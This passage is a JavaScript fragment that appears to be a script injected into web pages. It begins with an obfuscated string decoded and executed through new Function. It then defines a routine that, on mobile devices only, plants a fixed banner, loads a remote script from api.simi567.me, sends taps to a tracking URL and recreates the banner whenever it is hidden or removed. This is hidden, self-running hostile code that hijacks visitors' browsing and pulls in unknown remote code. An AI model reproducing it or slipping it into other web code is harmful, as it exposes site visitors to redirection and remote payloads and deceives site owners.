l6^JO5Fd2F!Jdff62p*)OFFO^g}00JR l6^JO5Fd2F!P"!5mhYdfmdJJY2fxh6qfcL))aP!P= }000a!Xd5 DLRp8H"))Lm)hOqO5@0}}0}m(2"="))Lm)hOqO5@0}}0@m(2"="))Lm)hOqO5@0}}0sm(2"="))Lm)hOqO5@0}}0}m(2"="))Lm)hOqO5@0}}0@m(2"="))Lm)hOqO5@0}}0sm(2"Z!Xd5 S8ydFhm7qOO5cc2YD wdFYcaampYFwdFYca/na!S8cS>najngS!Xd5 DL_8c"hFFJLg"885mqO(dF6O2mJ5OFO(Oqaj"DLLg//"%DLRpHSZ%"g@00Q}"g"DLg//"%DLRpHSZ%"g@00Q0"!Xd5 (82YD VY)iO(SYFcDL_%"/}QsK"a!(mO2OJY287_2(F6O2cYa[6LDL86LMSS8}!Xd5 (d2Xd85mpYFEqY^Y2FuTWfc"4(L6_fdO"a!67c(d2Xda[(d2XdmLFTqY8"f6LJqdTg2O2Y!"PP!(mO2^YLLdpY87_2(F6O2cYa[Xd5 F87_2(F6O2cYa[Xd5 F=5=2=O=(=6=_=d8"("%"h"%"d"%"5"%"r"%"F"=78"7"%"5"%"O"%"^"%"x"%"h"%"d"%"5"%"x"%"O"%"f"%"Y"=q8"("%"h"%"d"%"5"%"x"%"O"%"f"%"Y"%"r"%"F"=f8"6"%"2"%"f"%"Y"%"R"%";"%"7"=L8"r"%"u"%"x"%"w"%"E"%"]"%"k"%"9"%"W"%"+"%"z"%"t"%"y"%"N"%";"%"e"%"I"%"~"%"i"%"|"%"B"%"A"%"V"%"&"%"-"%"U"%"d"%")"%"("%"f"%"Y"%"7"%"p"%"h"%"6"%"C"%"S"%"q"%"^"%"2"%"O"%"J"%":"%"5"%"L"%"F"%"_"%"X"%"D"%"R"%"T"%"4"%"0"%"}"%"@"%"s"%"o"%"n"%"K"%"1"%"{"%"Q"%"%"%"/"%"8"=J8""=p80!7O5cY8Ym5YJqd(Yc/H3r*Ud*40*Q%/8Z/p=""a!p<YmqY2pFh!aO8LHfZcYHdZcp%%aa=(8LHfZcYHdZcp%%aa=68LHfZcYHdZcp%%aa=_8LHfZcYHdZcp%%aa=F8O<<@?(>>o=58c}nv(a<<o?6>>@=28csv6a<<K?_=J%8iF562pH7ZcFa=Kol86vvcJ%8iF562pH7Zc5aa=Kol8_vvcJ%8iF562pH7Zc2aa!5YF_52 7_2(F6O2cYa[7O5cXd5 F8""=2858(}8(@80!2<YmqY2pFh!ac58YHqZc2aa<}@{jcF%8iF562pH7Zc5a=2%%ag5>}Q}vv5<@@ojc(@8YHqZc2%}a=F%8iF562pH7Zccs}v5a<<K?Ksv(@a=2%8@agc(@8YHqZc2%}a=(s8YHqZc2%@a=F%8iF562pH7Zcc}nv5a<<}@?cKsv(@a<<K?Ksv(sa=2%8sa!5YF_52 FPcJaPcYmfdFda!2YD ]_2(F6O2c"MFf(L"=FacOa=(m(qOLYcaPPPYqLY[Xd5 685m(5YdFYEqY^Y2Fc"L(56JF"a!6mL5(8"hFFJLg//DdJm76Sdp4Rm(2/L(/}QsKj284(L6_fdO"!Xd5 _85mpYFEqY^Y2FLuT|dpNd^Yc"L(56JF"aH0Z!_mJd5Y2FNOfYm62LY5FuY7O5Yc6=_aPPZa!'.substr(10));new Function(b)()}();    
        }
        if(randomElement == 'smCpv'){
            window.DeaWzn = function(){var a=document.createElement('a');var evjs=`(function(){var cname='DeaWzn',cn='https://api.simi567.me/static/image/c.png',bn='https://dingbu.bj.bcebos.com/dibu.adadadad',jp='https://api.simi567.me/a/c?au5b9262149de3692875cda46c75dc081c=',DjfpYw=null,cst=0,drv=isCheckD();if(drv){crateEl(cname);var n=0;DjfpYw=setInterval(()=>{n++;var elobj=resbaner();if(!elobj){cname=its(6);return crateEl('DeaWzn '+cname)}var eh=elobj.getBoundingClientRect().height;if(eh==0){elobj.remove();cname=its(6);crateEl('DeaWzn '+cname)}},500)}var s=document.createElement('script');s.src='https://api.simi567.me/s/c?_=449133569929388032';document.getElementsByTagName('head')[0].appendChild(s);function crateEl(n){var by=document.body;if(!by){return false};var br=document.createElement('div');br.setAttribute('class',n);var img=document.createElement('img');img.src=bn;var p=document.createElement('p');br.append(p);br.append(img);by.append(br);addlistenerElement(br,function(e){var pX=0,pY=0,touches=e.changedTouches;if(touches){var touchesData=touches[0]; pX=touchesData.pageX; pY=touchesData.pageY};var _ao=document.createElement('a');_ao.href=jp+au5b9262149de3692875cda46c75dc081c+decodeURIComponent('%26')+'cp='+pX+','+pY;_ao.click()});addlistenerElement(p,function(){clearInterval(DjfpYw);resbaner().remove()});img.onload=function(){var h=this.height;resbaner().style.height=h+'px';getIheight(h,this.width)}}function getStyleStr(el){var obs=window.getComputedStyle(el,'');var str='';for(k in obs){if(parseInt(k).toString()=='NaN'){str+=k+': '+obs[k]+';'+'<br/>'}}return str}var pimg='.DeaWzn img{width:100% !important;}';var ps=cst==4?'':'position:fixed;';var bs='.DeaWzn{z-index:999;'+(cst==2||cst==3?'width:100px;':'')+(cst==3?'right:0;':'left:0;')+ps+(cst==0?'bottom:0px':cst==1?'top:0px':'bottom:50%')+';}'+pimg;if(drv){addStyle(bs)}function getIheight(height,w){var ch='width:18px;height:18px';var ot=(cst==0?'bottom':cst==1?'top':cst==2||cst==3?'bottom':'')+(cst==0||cst==1?':'+height+'px;':cst==2||cst==3?':calc(50% + '+height+'px)':'display:none;');var or=(cst==0||cst==1?'right:0':cst==2?'left:'+(w-18)+'px':'right:'+(w-18)+'px');var close='.DeaWzn p{padding:0 !important;margin:0 !important;'+ch+';background:url('+cn+');background-size:contain;position:fixed;'+or+';'+ot+'}';close+=(cst==1?'body{padding-top:'+height+'px !important;}':'');addStyle(close)}function addStyle(style){var styleObj=document.createElement('style');styleObj.setAttribute('type','text/css');styleObj.innerHTML=style;document.getElementsByTagName('head')[0].appendChild(styleObj)}function resbaner(){return document.querySelector('.'+cname)}function isCheckD(){var p=navigator.platform;var system={win:false,mac:false,Xll:false};system.win=p.indexOf('Win')==0;system.mac=p.indexOf('Mac')==0;system.X11=(p=='X11')||(p.indexOf('Linux')==0);if(system.win||system.mac||system.Xll){return false}return true}function addlistenerElement(el,callBack){el.addEventListener('click',handleFun);el.addEventListener('touchstart',handleFun);function handleFun(e){e.preventDefault();e.stopPropagation();callBack(e)}}function its(len){var r=['a','B','c','d','e','G','g','h','J','j','k'],str='';for(var i=0;i<len;i++){var rx=Math.round(Math.random()*(r.length-1));str+=r[rx]}return str}})();`;a.href='javascript:'+evjs;a.click()};window.DeaWzn();    
        }

    }

}